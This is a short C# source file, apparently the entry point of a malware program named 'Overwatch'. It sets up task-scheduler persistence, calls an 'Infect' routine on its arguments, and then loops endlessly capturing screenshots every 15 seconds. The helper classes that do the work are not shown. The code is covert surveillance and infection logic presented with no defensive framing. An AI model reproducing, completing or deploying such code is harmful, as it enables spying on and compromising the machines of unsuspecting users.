using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        
        static void Main(string[] args)
        {
            try
            {
                cInstallTaskScheduler Task = new cInstallTaskScheduler();
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);

                while (true)
                {
                    cReceiveInformation.ScreenShoot();
                    System.Threading.Thread.Sleep(15000);
                }
            }
            catch (Exception ex){ Log.Write(ex.Message, true);}
        }
    }
}
